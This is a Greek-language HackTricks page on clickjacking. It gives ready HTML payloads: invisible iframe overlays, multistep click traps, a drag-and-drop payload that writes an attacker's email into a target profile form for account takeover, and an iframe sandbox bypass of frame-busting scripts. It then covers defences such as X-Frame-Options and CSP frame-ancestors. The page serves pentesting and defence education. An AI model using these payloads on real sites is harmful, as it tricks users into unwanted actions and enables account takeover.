# Clickjacking

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Τι είναι το Clickjacking

Σε μια επίθεση clickjacking, ένας **χρήστης** εξαπατιέται να **κάνει κλικ** σε ένα **στοιχείο** σε μια ιστοσελίδα που είναι είτε **αόρατο** είτε μεταμφιεσμένο ως διαφορετικό στοιχείο. Αυτή η απάτη μπορεί να οδηγήσει σε ανεπιθύμητες συνέπειες για τον χρήστη, όπως η λήψη κακόβουλου λογισμικού, η ανακατεύθυνση σε κακόβουλες ιστοσελίδες, η παροχή διαπιστευτηρίων ή ευαίσθητων πληροφοριών, οι μεταφορές χρημάτων ή η online αγορά προϊόντων.


### Κόλπος προεπιλογής φορμών

Μερικές φορές είναι δυνατόν να **συμπληρώσετε την τιμή των πεδίων μιας φόρμας χρησιμοποιώντας παραμέτρους GET κατά τη φόρτωση μιας σελίδας**. Ένας επιτιθέμενος μπορεί να καταχραστεί αυτήν τη συμπεριφορά για να συμπληρώσει μια φόρμα με αυθαίρετα δεδομένα και να στείλει το clickjacking payload ώστε ο χρήστης να πατήσει το κουμπί Υποβολή.

### Συμπλήρωση φόρμας με Drag\&Drop

Εάν χρειάζεστε τον χρήστη να **συμπληρώσει μια φόρμα** αλλά δεν θέλετε να του ζητήσετε απευθείας να γράψει κάποιες συγκεκριμένες πληροφορίες (όπως το email και/ή συγκεκριμένο κωδικό πρόσβασης που γνωρίζετε), μπορείτε απλά να του ζητήσετε να **σύρει και αποθέσει** κάτι που θα γράψει τα ελεγχόμενα δεδομένα σας όπως σε [**αυτό το παράδειγμα**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Βασικό Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Πολυβήματος Φορτίο

Το πολυβήματος φορτίο είναι μια τεχνική που χρησιμοποιείται στο clickjacking για να εκτελέσει πολλαπλές ενέργειες με ένα μόνο κλικ. Αυτή η τεχνική επιτρέπει στον επιτιθέμενο να εκτελέσει πολλαπλές ενέργειες χωρίς τη συναίνεση του θύματος.

Για να υλοποιηθεί αυτή η τεχνική, ο επιτιθέμενος δημιουργεί ένα κακόβουλο ιστοσελίδα που περιέχει πολλαπλά κρυφά πλαίσια. Κάθε πλαίσιο περιέχει μια ενέργεια που θα εκτελεστεί με ένα κλικ από το θύμα. Όταν το θύμα κάνει κλικ σε ένα κρυφό πλαίσιο, οι ενέργειες που περιέχονται σε αυτό εκτελούνται αυτόματα χωρίς να το καταλάβει.

Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να εκτελέσει επιθέσεις όπως η αποστολή αιτήσεων HTTP, η αποστολή email, η ανάρτηση σε κοινωνικά δίκτυα και πολλές άλλες ενέργειες που μπορούν να προκαλέσουν ζημιά στο θύμα.

Για να προστατευτείτε από αυτήν την επίθεση, είναι σημαντικό να ελέγχετε πάντα την πηγή των ιστοσελίδων που επισκέπτεστε και να μην κάνετε κλικ σε ύποπτα ή αδιευκρίνιστα στοιχεία.
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Φορτίο Drag\&Drop + Click

Η τεχνική Drag\&Drop + Click είναι μια επιθετική τεχνική που συνδυάζει την εκμετάλλευση της ευπάθειας του Clickjacking με τη χρήση της λειτουργίας Drag\&Drop των προγραμμάτων περιήγησης. Αυτή η τεχνική επιτρέπει στον επιτιθέμενο να εκτελέσει κακόβουλο κώδικα με την απλή ενέργεια του χρήστη να σύρει και να απελευθερώσει ένα αντικείμενο στην ιστοσελίδα.

Για να επιτευχθεί αυτή η επίθεση, ο επιτιθέμενος δημιουργεί μια ιστοσελίδα που περιέχει ένα κακόβουλο στοιχείο που είναι κρυμμένο από το χρήστη. Όταν ο χρήστης σύρει και απελευθερώσει ένα αντικείμενο στην ιστοσελίδα, ο κακόβουλος κώδικας εκτελείται αυτόματα, εκμεταλλευόμενος την ευπάθεια του Clickjacking. Αυτό μπορεί να οδηγήσει σε διάφορες επιθέσεις, όπως την κλοπή διαπιστευτηρίων, την εκτέλεση κακόβουλου κώδικα ή την αποκάλυψη ευαίσθητων πληροφοριών.

Για να προστατευθείτε από αυτήν την επίθεση, είναι σημαντικό να ελέγχετε προσεκτικά τις ιστοσελίδες που επιτρέπετε στους χρήστες να σύρουν και να απελευθερώσουν αντικείμενα. Επίσης, μπορείτε να χρησιμοποιήσετε τον HTTP header "X-Frame-Options" για να περιορίσετε την ενσωμάτωση της ιστοσελίδας σε άλλα πλαίσια, μειώνοντας έτσι τον κίνδυνο του Clickjacking.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Εάν έχετε εντοπίσει μια επίθεση **XSS που απαιτεί από τον χρήστη να κάνει κλικ** σε κάποιο στοιχείο για να **ενεργοποιηθεί** το XSS και η σελίδα είναι **ευάλωτη στο clickjacking**, μπορείτε να το εκμεταλλευτείτε για να εξαπατήσετε τον χρήστη να κάνει κλικ στο κουμπί/σύνδεσμο.\
Παράδειγμα:\
_Βρήκατε ένα **self XSS** σε ορισμένες προσωπικές λεπτομέρειες του λογαριασμού (λεπτομέρειες που **μόνο εσείς μπορείτε να ορίσετε και να διαβάσετε**). Η σελίδα με τη **φόρμα** για την ορισμό αυτών των λεπτομερειών είναι **ευάλωτη** στο **clickjacking** και μπορείτε να **προ-γεμίσετε** τη **φόρμα** με τις παραμέτρους GET._\
\_\_Ένας επιτιθέμενος μπορεί να προετοιμάσει μια επίθεση **clickjacking** σε αυτήν τη σελίδα **προ-γεμίζοντας** τη **φόρμα** με το **XSS payload** και να εξαπατήσει τον **χρήστη** να **υποβάλει** τη φόρμα. Έτσι, **όταν η φόρμα υποβάλλεται** και οι τιμές τροποποιούνται, ο **χρήστης θα εκτελέσει το XSS**.

## Στρατηγικές για την αντιμετώπιση του Clickjacking

### Προστασία στην πλευρά του πελάτη

Τα scripts που εκτελούνται στην πλευρά του πελάτη μπορούν να εκτελέσουν ενέργειες για την πρόληψη του Clickjacking:

* Βεβαιωθείτε ότι το παράθυρο της εφαρμογής είναι το κύριο ή το επικεφαλής παράθυρο.
* Καθιστώντας όλα τα πλαίσια ορατά.
* Αποτροπή κλικ σε αόρατα πλαίσια.
* Ανίχνευση και ειδοποίηση των χρηστών για πιθανές προσπάθειες Clickjacking.

Ωστόσο, αυτά τα scripts για την αποτροπή των πλαισίων μπορεί να παρακαμφθούν:

* **Ρυθμίσεις ασφαλείας των προγραμμάτων περιήγησης:** Ορισμένοι προγράμματα περιήγησης μπορεί να αποκλείσουν αυτά τα scripts με βάση τις ρυθμίσεις ασφαλείας τους ή την έλλειψη υποστήριξης JavaScript.
* **Χαρακτηριστικό `sandbox` του HTML5 iframe:** Ένας επιτιθέμενος μπορεί να ανενεργοποιήσει τα scripts που αποτρέπουν τα πλαίσια με την ρύθμιση του χαρακτηριστικού `sandbox` με τις τιμές `allow-forms` ή `allow-scripts` χωρίς το `allow-top-navigation`. Αυτό εμποδίζει το iframe από το να επαληθεύσει αν είναι το κύριο παράθυρο, π.χ.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Οι τιμές `allow-forms` και `allow-scripts` ενεργοποιούν ενέργειες μέσα στο iframe ενώ απενεργοποιούν την πλοήγηση σε επίπεδο κορυφής. Για να εξασφαλιστεί η επιθυμητή λειτουργικότητα του στόχου, ενδέχεται να χρειαστούν επιπλέον άδειες όπως `allow-same-origin` και `allow-modals`, ανάλογα με τον τύπο της επίθεσης. Τα μηνύματα της κονσόλας του προγράμματος περιήγησης μπορούν να καθοδηγήσουν για τις άδειες που πρέπει να επιτραπούν.

### Προστασίες στην πλευρά του διακομιστή

#### Επικεφαλίδα απόκρισης HTTP X-Frame-Options

Η επικεφαλίδα **`X-Frame-Options`** ενημερώνει τους προγράμματα περιήγησης για την νομιμότητα της απεικόνισης μιας σελίδας σε ένα `<frame>` ή `<iframe>`, βοηθώντας στην πρόληψη του Clickjacking:

* `X-Frame-Options: deny` - Κανένας τομέας δεν μπορεί να απεικονίσει το περιεχόμενο.
* `X-Frame-Options: sameorigin` - Μόνο ο τρέχων ιστότοπος μπορεί να απεικονίσει το περιεχόμενο.
* `X-Frame-Options: allow-from https://trusted.com` - Μόνο ο καθορισμένος 'uri' μπορεί να απεικονίσει τη σελίδα.
* Σημειώστε τους περιορισμούς: αν ο πρόγραμμα περιήγησης δεν υποστηρίζει αυτήν την οδηγία, ενδέχεται να μην λειτουργήσει. Ορισμένοι προγράμματα περιήγησης προτιμούν την οδηγία CSP frame-ancestors.

#### Οδηγία frame-ancestors της πολιτικής ασφαλείας του περιεχομένου (CSP)

Η οδηγία **`frame-ancestors`** στην πολιτική ασφαλείας του περιεχομένου (CSP) είναι η συνιστώμενη μέθοδος για την προστασία από το Clickjacking:

* `frame-ancestors 'none'` - Παρόμοιο με το `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Παρόμοιο με το `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Παρόμοιο με το `X-Frame-Options: allow-from`.

Για παράδειγμα, η παρακάτω πολιτική ασφαλείας του περιεχομένου επιτρέπει μόνο την απεικόνιση από τον ίδιο τομέα:

`Content-Security-Policy: frame-ancestors 'self';`

Περισσότερες λεπτομέρειες και περίπλοκα παραδείγματα μπορούν να βρεθούν στην [τεκμηρίωση της CSP για την οδηγία frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) και στην [τεκμηρίωση της CSP frame-ancestors της Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Πολιτική ασφαλείας του περιεχομένου (CSP) με τις οδηγίες `child-src` και `frame-src`

Η πολιτική ασφαλείας του περιεχομένου (CSP) είναι μια μέτρηση ασφαλείας που βοηθά στην πρόληψη του Clickjacking και άλλων επιθέσεων εισαγωγής κώδικα, καθορίζοντας από ποιες πηγές θα πρέπει να επιτραπεί στον πρόγραμμα περιήγησης να φορτώσει περιεχόμενο.

#### Οδηγία `frame-src`
- Καθορίζει έγκυρες πηγές για τα πλαίσια.
- Πιο συγκεκριμένη από την οδηγία `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Αυτή η πολιτική επιτρέπει πλαίσια από την ίδια προέλευση (self) και https://trusted-website.com.

#### Οδηγία `child-src`
- Εισήχθη στο CSP επίπεδο 2 για να ορίσει έγκυρες πηγές για web workers και πλαίσια.
- Λειτουργεί ως εναλλακτική λύση για τις οδηγίες frame-src και worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Αυτή η πολιτική επιτρέπει πλαίσια και εργαζομένους από την ίδια προέλευση (self) και https://trusted-website.com.

**Σημειώσεις χρήσης:**
- Απόσυρση: η child-src αποσύρεται υπέρ της frame-src και worker-src.
- Εναλλακτική συμπεριφορά: Εάν λείπει η frame-src, χρησιμοποιείται η child-src ως εναλλακτική για τα πλαίσια. Εάν και οι δύο λείπουν, χρησιμοποιείται η default-src.
- Αυστηρός ορισμός πηγής: Συμπεριλάβετε μόνο αξιόπιστες πηγές στις οδηγίες για να αποτρέψετε την εκμετάλλευση.

#### Σενάρια JavaScript Frame-Breaking

Παρόλο που δεν είναι απόλυτα αξιόπιστα, τα σενάρια frame-busting βασισμένα σε JavaScript μπορούν να χρησιμοποιηθούν για να αποτρέψουν μια ιστοσελίδα από το να εμφανίζεται σε πλαίσιο. Παράδειγμα:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Χρήση Αντι-CSRF Διακριτικών

* **Έλεγχος Διακριτικών:** Χρησιμοποιήστε αντι-CSRF διακριτικά σε ιστοσελίδες για να διασφαλίσετε ότι οι αιτήσεις που αλλάζουν την κατάσταση γίνονται εσκεμμένα από τον χρήστη και όχι μέσω μιας Clickjacked σελίδας.

## Αναφορές

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
